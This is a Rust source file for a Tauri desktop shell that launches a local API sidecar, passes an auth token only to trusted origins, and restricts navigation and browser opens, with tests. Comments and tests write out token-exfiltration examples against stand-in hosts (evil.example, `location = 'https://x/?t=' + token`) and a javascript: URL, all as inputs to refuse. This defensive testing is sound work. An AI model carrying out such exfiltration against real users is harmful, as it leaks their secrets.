//! OHarness Tauri shell — window chrome + FastAPI sidecar lifecycle.
//!
//! ADR 0001: decorations off; TitleBar is the real chrome. Sidecar is the
//! FastAPI binary bundled from `binaries/oharness-sidecar` and installed
//! beside the desktop executable as `oharness-sidecar`.

#[cfg(windows)]
use std::os::windows::process::CommandExt;
use std::sync::Mutex;
use std::{
    net::{SocketAddr, TcpListener, TcpStream},
    thread,
    time::{Duration, Instant},
};
use tauri::{AppHandle, Manager, RunEvent, WebviewWindowBuilder};
use tauri_plugin_shell::process::CommandChild;
use tauri_plugin_shell::ShellExt;

struct SidecarProcess {
    child: CommandChild,
    pid: u32,
}

struct SidecarState(Mutex<Option<SidecarProcess>>);

const SIDECAR_NAME: &str = "oharness-sidecar";

#[cfg(windows)]
fn terminate_process_tree(pid: u32) {
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
    let _ = std::process::Command::new("taskkill")
        .args(["/PID", &pid.to_string(), "/T", "/F"])
        .creation_flags(CREATE_NO_WINDOW)
        .status();
}

#[cfg(not(windows))]
fn terminate_process_tree(_pid: u32) {}

fn stop_sidecar(process: SidecarProcess) {
    // PyInstaller one-file executables launch a worker process. Kill the tree
    // first on Windows so closing OHarness cannot leave the API running.
    terminate_process_tree(process.pid);
    let _ = process.child.kill();
}

/// Origins the bundled app is served from (`http://tauri.localhost` on
/// Windows, `tauri://localhost` elsewhere). Only these receive the token.
const APP_ORIGINS: [&str; 2] = ["http://tauri.localhost", "tauri://localhost"];

/// Defines `__OH_API__` / `__OH_TOKEN__` — but only when the document is the
/// app itself. The script runs on every document the webview loads, so any
/// other page (should one ever slip past the navigation guard) gets nothing.
/// Origins that receive the token: the app, plus the dev server in dev builds.
fn token_origins(dev_url: Option<&tauri::Url>) -> Vec<String> {
    let mut origins: Vec<String> = APP_ORIGINS.iter().map(|o| o.to_string()).collect();
    if let Some(dev) = dev_url {
        origins.push(dev.origin().ascii_serialization());
    }
    origins
}

fn initialization_script<S: AsRef<str> + serde::Serialize>(
    api: &str,
    token: &str,
    origins: &[S],
) -> String {
    format!(
        "if ({}.includes(window.location.origin)) {{ Object.defineProperties(window, {{ __OH_API__: {{ value: {}, writable: false }}, __OH_TOKEN__: {{ value: {}, writable: false }} }}); }}",
        serde_json::to_string(origins).expect("origins serialize"),
        serde_json::to_string(api).expect("API URL serializes"),
        serde_json::to_string(token).expect("token serializes"),
    )
}

fn generate_token() -> Result<String, String> {
    let mut bytes = [0_u8; 32];
    getrandom::fill(&mut bytes).map_err(|e| format!("token generation failed: {e}"))?;
    Ok(bytes.iter().map(|byte| format!("{byte:02x}")).collect())
}

fn reserve_port() -> Result<u16, String> {
    let listener =
        TcpListener::bind(("127.0.0.1", 0)).map_err(|e| format!("port allocation failed: {e}"))?;
    listener
        .local_addr()
        .map(|addr| addr.port())
        .map_err(|e| e.to_string())
}

fn wait_until_ready(port: u16, timeout: Duration) -> bool {
    let address = SocketAddr::from(([127, 0, 0, 1], port));
    let deadline = Instant::now() + timeout;
    while Instant::now() < deadline {
        if TcpStream::connect_timeout(&address, Duration::from_millis(150)).is_ok() {
            return true;
        }
        thread::sleep(Duration::from_millis(75));
    }
    false
}

fn spawn_sidecar(app: &AppHandle, port: u16, token: &str) -> Result<(), String> {
    let data_dir = app
        .path()
        .app_local_data_dir()
        .map_err(|e| format!("app data directory lookup failed: {e}"))?;
    let shell = app.shell();
    let sidecar = shell
        .sidecar(SIDECAR_NAME)
        .map_err(|e| format!("sidecar lookup failed: {e}"))?
        .env("OH_PORT", port.to_string())
        .env("OH_SIDECAR_TOKEN", token)
        .env("OH_DATA_DIR", data_dir);

    let (mut _rx, child) = sidecar
        .spawn()
        .map_err(|e| format!("sidecar spawn failed: {e}"))?;
    let pid = child.pid();

    if !wait_until_ready(port, Duration::from_secs(15)) {
        stop_sidecar(SidecarProcess { child, pid });
        return Err(format!("sidecar did not become ready on port {port}"));
    }

    let state = app.state::<SidecarState>();
    *state.0.lock().map_err(|e| e.to_string())? = Some(SidecarProcess { child, pid });
    Ok(())
}

/// Whether the main webview may load `url`: the app's own assets, the dev
/// server in dev builds, and same-origin blob/about:blank documents. Anything
/// else is refused — a navigation is not governed by the CSP, and the
/// initialization script would hand `__OH_TOKEN__` to whatever page loads.
fn is_app_navigation(url: &tauri::Url, dev_url: Option<&tauri::Url>) -> bool {
    match url.scheme() {
        "tauri" => url.host_str() == Some("localhost") && url.port().is_none(),
        "about" => url.as_str() == "about:blank",
        // blob:http://tauri.localhost/<uuid> — judge the origin it was minted in.
        "blob" => url
            .path()
            .parse::<tauri::Url>()
            .is_ok_and(|inner| inner.scheme() != "blob" && is_app_navigation(&inner, dev_url)),
        // wry serves the app only at http://tauri.localhost (no port); any other
        // port or https goes to the network, where *.localhost is loopback.
        "http" | "https" => {
            (url.scheme() == "http"
                && url.host_str() == Some("tauri.localhost")
                && url.port().is_none())
                || dev_url.is_some_and(|dev| dev.origin() == url.origin())
        }
        _ => false,
    }
}

/// The only pages the app hands to the system browser: the providers' docs
/// links (`frontend/src/components/providers/catalog.ts`, pinned by a test).
/// Opening arbitrary refused URLs would turn the guard into an exfiltration
/// channel (`location = "https://x/?t=" + token`), so the match is exact.
const DOCS_URLS: [&str; 5] = [
    "https://docs.anthropic.com",
    "https://cursor.com/docs/api",
    "https://platform.openai.com/docs",
    "https://docs.ollama.com",
    "https://openrouter.ai/docs",
];

fn is_docs_link(url: &tauri::Url) -> bool {
    DOCS_URLS
        .iter()
        .filter_map(|docs| docs.parse::<tauri::Url>().ok())
        .any(|docs| &docs == url)
}

/// At most one browser open per second (a looping window.open can't spam tabs).
#[derive(Default)]
struct Throttle(Mutex<Option<Instant>>);

impl Throttle {
    fn allow(&self, now: Instant) -> bool {
        let Ok(mut last) = self.0.lock() else {
            return false;
        };
        if last.is_some_and(|t| now.saturating_duration_since(t) < Duration::from_secs(1)) {
            return false;
        }
        *last = Some(now);
        true
    }
}

fn kill_sidecar(app: &AppHandle) {
    if let Ok(mut guard) = app.state::<SidecarState>().0.lock() {
        if let Some(process) = guard.take() {
            stop_sidecar(process);
        }
    }
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_shell::init())
        .plugin(tauri_plugin_dialog::init())
        .plugin(tauri_plugin_fs::init())
        .manage(SidecarState(Mutex::new(None)))
        .setup(|app| {
            let token = generate_token().map_err(std::io::Error::other)?;
            let port = reserve_port().map_err(std::io::Error::other)?;
            spawn_sidecar(app.handle(), port, &token).map_err(std::io::Error::other)?;

            // The config keeps `create: false` so this initialization script
            // runs before any frontend module can issue an authenticated fetch.
            let config = app
                .config()
                .app
                .windows
                .iter()
                .find(|window| window.label == "main")
                .cloned()
                .ok_or_else(|| std::io::Error::other("main window config missing"))?;
            let api = format!("http://127.0.0.1:{port}");
            let dev_url = if cfg!(dev) {
                app.config().build.dev_url.clone()
            } else {
                None
            };
            let popup_app = app.handle().clone();
            let throttle = Throttle::default();
            let origins = token_origins(dev_url.as_ref());
            let window_builder = WebviewWindowBuilder::from_config(app.handle(), &config)?;
            // Windows uses the runtime window icon for the taskbar. Embed the
            // adaptive 32 px asset directly so Cargo tracks icon changes and a
            // stale executable resource cannot diverge from the installed icon.
            #[cfg(windows)]
            let window_builder = window_builder.icon(tauri::image::Image::from_bytes(
                include_bytes!("../icons/32x32.png"),
            )?)?;

            window_builder
                .initialization_script(initialization_script(&api, &token, &origins))
                // Navigation isn't governed by CSP. Refused URLs are dropped, never
                // re-opened elsewhere. (tauri-runtime-wry allows URIs it can't parse
                // without calling this; the origin-gated init script covers that.)
                .on_navigation(move |url| is_app_navigation(url, dev_url.as_ref()))
                .on_new_window(move |url, _features| {
                    if is_docs_link(&url) && throttle.allow(Instant::now()) {
                        // tauri-plugin-shell's open is deprecated in favour of
                        // tauri-plugin-opener; kept to avoid a new dependency (backlog).
                        #[allow(deprecated)]
                        let _ = popup_app.shell().open(url.as_str(), None);
                    }
                    tauri::webview::NewWindowResponse::Deny
                })
                .build()?;
            Ok(())
        })
        .build(tauri::generate_context!())
        .expect("error while building OHarness")
        .run(|app_handle, event| {
            if let RunEvent::Exit = event {
                kill_sidecar(app_handle);
            }
        });
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn initialization_script_serializes_values_without_executable_injection() {
        let script = initialization_script("http://127.0.0.1:8123", "tok\"en", &APP_ORIGINS);
        assert!(script.contains("http://127.0.0.1:8123"));
        assert!(script.contains("tok\\\"en"));
        assert!(script.contains("__OH_API__"));
        assert!(script.contains("__OH_TOKEN__"));
    }

    #[test]
    fn generated_tokens_are_random_hex_secrets() {
        let first = generate_token().unwrap();
        let second = generate_token().unwrap();
        assert_eq!(first.len(), 64);
        assert!(first.chars().all(|character| character.is_ascii_hexdigit()));
        assert_ne!(first, second);
    }

    #[test]
    fn main_window_is_not_auto_created_because_setup_builds_it_with_the_token_script() {
        let config: serde_json::Value =
            serde_json::from_str(include_str!("../tauri.conf.json")).unwrap();
        let main = config["app"]["windows"]
            .as_array()
            .unwrap()
            .iter()
            .find(|w| w["label"] == "main")
            .expect("main window config");
        assert_eq!(main["create"], serde_json::Value::Bool(false));
    }

    #[test]
    fn main_window_leaves_drag_and_drop_to_the_page() {
        // With Tauri's drag-drop handler on (the default), WebView2 on Windows
        // swallows HTML5 drag events, so palette → canvas drops never fire.
        // setup() builds the window via from_config, which honours this flag.
        let config: serde_json::Value =
            serde_json::from_str(include_str!("../tauri.conf.json")).unwrap();
        let main = config["app"]["windows"]
            .as_array()
            .unwrap()
            .iter()
            .find(|w| w["label"] == "main")
            .cloned()
            .expect("main window config");
        let window: tauri::utils::config::WindowConfig = serde_json::from_value(main).unwrap();
        assert!(!window.drag_drop_enabled);
    }

    fn csp_directive<'a>(csp: &'a str, name: &str) -> Option<&'a str> {
        csp.split(';')
            .map(str::trim)
            .find(|d| d.split_whitespace().next() == Some(name))
    }

    #[test]
    fn production_csp_is_strict() {
        // The webview holds the sidecar token (__OH_TOKEN__) and Tauri IPC, so
        // an XSS must not be able to run injected script or reach other hosts.
        let config: serde_json::Value =
            serde_json::from_str(include_str!("../tauri.conf.json")).unwrap();
        let security = &config["app"]["security"];
        let csp = security["csp"]
            .as_str()
            .expect("app.security.csp must be set");

        let script = csp_directive(csp, "script-src").expect("script-src");
        assert_eq!(script, "script-src 'self'", "Tauri appends its own hashes");
        assert!(!csp.contains("unsafe-eval"));

        let connect = csp_directive(csp, "connect-src").expect("connect-src");
        for src in connect.split_whitespace().skip(1) {
            assert!(
                [
                    "'self'",
                    "ipc:",
                    "http://ipc.localhost",
                    "http://127.0.0.1:*"
                ]
                .contains(&src),
                "connect-src may only reach IPC and the loopback sidecar, got {src}"
            );
        }
        for locked in [
            "default-src 'self'",
            "object-src 'none'",
            "frame-src 'none'",
            "frame-ancestors 'none'",
            "base-uri 'self'",
            "form-action 'self'",
        ] {
            assert!(csp.contains(locked), "missing {locked}");
        }
        // No other directive may reach beyond the app itself.
        for directive in csp.split(';').map(str::trim).filter(|d| !d.is_empty()) {
            let mut parts = directive.split_whitespace();
            let name = parts.next().unwrap();
            assert!(
                !matches!(name, "script-src-elem" | "script-src-attr"),
                "{name} would override script-src"
            );
            if name == "connect-src" {
                continue;
            }
            for src in parts {
                assert!(
                    ["'self'", "'none'", "'unsafe-inline'", "data:", "blob:"].contains(&src),
                    "{name} allows {src}"
                );
            }
        }
        // Only style-src may opt out of Tauri's nonce injection (React style attributes).
        assert_eq!(
            security["dangerousDisableAssetCspModification"],
            serde_json::json!(["style-src"])
        );
    }

    fn url(s: &str) -> tauri::Url {
        s.parse().unwrap()
    }

    #[test]
    fn the_webview_may_only_navigate_within_the_app() {
        let dev: tauri::Url = url("http://127.0.0.1:3000");
        for ok in [
            "http://tauri.localhost/",
            "http://tauri.localhost/studio?x=1",
            "tauri://localhost/index.html",
            "about:blank",
            "blob:http://tauri.localhost/5b1d4c0e-0000-4000-8000-000000000000",
        ] {
            assert!(
                is_app_navigation(&url(ok), None),
                "{ok} should stay in the app"
            );
        }
        for bad in [
            "https://evil.example/?t=secret",
            "http://127.0.0.1:8000/providers",
            "http://127.0.0.1:3000/",
            "file:///C:/Windows/win.ini",
            "blob:https://evil.example/x",
            "about:srcdoc",
            "javascript:alert(1)",
            "http://tauri.localhost:8123/",
            "https://tauri.localhost/",
            "tauri://evil/",
            "tauri://localhost:99/",
        ] {
            assert!(!is_app_navigation(&url(bad), None), "{bad} must be refused");
        }
        // The dev server is the app only in dev builds, where it is passed in.
        assert!(is_app_navigation(
            &url("http://127.0.0.1:3000/"),
            Some(&dev)
        ));
        assert!(!is_app_navigation(
            &url("http://127.0.0.1:3001/"),
            Some(&dev)
        ));
    }

    #[test]
    fn the_token_is_only_defined_for_the_app_origin() {
        // Defence in depth (SEC re-review of #43, F1b/F3): any other page that
        // ends up in the webview must not receive __OH_TOKEN__.
        let script = initialization_script("http://127.0.0.1:1", "t", &APP_ORIGINS);
        let guard = script.split("Object.defineProperties").next().unwrap();
        // Exactly `if (<origins>.includes(window.location.origin)) {` — nothing
        // that could short-circuit the check.
        let origins_json = serde_json::to_string(&APP_ORIGINS).unwrap();
        assert_eq!(
            guard,
            format!("if ({origins_json}.includes(window.location.origin)) {{ ")
        );
        for origin in APP_ORIGINS {
            assert!(guard.contains(&format!("\"{origin}\"")), "{origin} missing");
        }
        assert!(
            !guard.contains("127.0.0.1"),
            "the sidecar is not an app origin"
        );
    }

    #[test]
    fn dev_builds_also_hand_the_token_to_the_dev_server_only() {
        assert_eq!(token_origins(None), APP_ORIGINS.map(String::from).to_vec());
        let dev = url("http://127.0.0.1:3000/");
        let with_dev = token_origins(Some(&dev));
        assert!(with_dev.contains(&"http://127.0.0.1:3000".to_string()));
        assert_eq!(with_dev.len(), APP_ORIGINS.len() + 1);
    }

    #[test]
    fn only_catalog_docs_pages_open_in_the_system_browser() {
        // SEC re-review of #43, F1: opening any refused URL in the browser was
        // an exfil channel (location = "https://x/?t=" + token). Exact allowlist.
        for docs in DOCS_URLS {
            assert!(is_docs_link(&url(docs)), "{docs}");
        }
        for not_docs in [
            "https://openrouter.ai/docs?t=secret",
            "https://openrouter.ai/docs#t=secret",
            "https://openrouter.ai/docs/../keys",
            "https://openrouter.ai/",
            "https://evil.example/docs",
            "http://openrouter.ai/docs",
            "https://openrouter.ai.evil.example/docs",
            "http://127.0.0.1:8000/",
            "file:///C:/x",
        ] {
            assert!(!is_docs_link(&url(not_docs)), "{not_docs}");
        }
    }

    #[test]
    fn docs_allowlist_matches_the_provider_catalog() {
        // Every docs link the UI renders must be openable, and nothing else.
        let catalog = include_str!("../../frontend/src/components/providers/catalog.ts");
        let mut in_catalog: Vec<String> = catalog
            .lines()
            .filter_map(|l| l.trim().strip_prefix("docs: \""))
            .filter_map(|rest| rest.split('"').next())
            .map(|u| url(u).to_string())
            .collect();
        in_catalog.sort();
        let mut allowed: Vec<String> = DOCS_URLS.iter().map(|u| url(u).to_string()).collect();
        allowed.sort();
        assert!(!in_catalog.is_empty());
        assert_eq!(allowed, in_catalog);
    }

    #[test]
    fn browser_opens_are_throttled() {
        let throttle = Throttle::default();
        let t0 = std::time::Instant::now();
        assert!(throttle.allow(t0));
        assert!(!throttle.allow(t0 + std::time::Duration::from_millis(300)));
        assert!(throttle.allow(t0 + std::time::Duration::from_millis(1200)));
    }

    #[test]
    fn capabilities_grant_every_native_dialog_the_frontend_calls() {
        // lib/nativeDialog.ts pickFolder() -> dialog open; lib/ohmFile.ts -> dialog save + fs write.
        // A missing grant fails silently at runtime, and any extra dialog/fs grant
        // (or a static fs scope) widens what the webview can touch — pin the exact set.
        let caps: serde_json::Value =
            serde_json::from_str(include_str!("../capabilities/default.json")).unwrap();
        let mut granted: Vec<String> = caps["permissions"]
            .as_array()
            .unwrap()
            .iter()
            .map(|p| match p.as_str() {
                Some(id) => id.to_string(),
                None => p["identifier"].as_str().unwrap_or_default().to_string(),
            })
            .filter(|id| id.starts_with("dialog:") || id.starts_with("fs:"))
            .collect();
        granted.sort();
        assert_eq!(
            granted,
            [
                "dialog:allow-open",
                "dialog:allow-save",
                "fs:allow-write-text-file",
            ]
        );
    }

    #[test]
    fn capabilities_grant_every_window_control_the_title_bar_calls() {
        // TitleBar.tsx calls `win?.toggleMaximize?.()` etc.; each maps to a
        // `core:window:allow-<kebab>` grant, and a missing one fails silently.
        let title_bar = include_str!("../../frontend/src/components/shell/TitleBar.tsx");
        let caps = include_str!("../capabilities/default.json");
        let calls: Vec<&str> = title_bar
            .split("win?.")
            .skip(1)
            .filter_map(|rest| rest.split("?.(").next())
            .collect();
        assert!(calls.contains(&"toggleMaximize"), "{calls:?}");
        for call in calls {
            let kebab: String = call
                .chars()
                .flat_map(|c| {
                    if c.is_ascii_uppercase() {
                        vec!['-', c.to_ascii_lowercase()]
                    } else {
                        vec![c]
                    }
                })
                .collect();
            let grant = format!("\"core:window:allow-{kebab}\"");
            assert!(caps.contains(&grant), "missing {grant} for win.{call}()");
        }
    }

    #[test]
    fn reserve_port_returns_a_loopback_port_that_can_be_rebound() {
        let port = reserve_port().unwrap();
        TcpListener::bind(("127.0.0.1", port)).unwrap();
    }
}
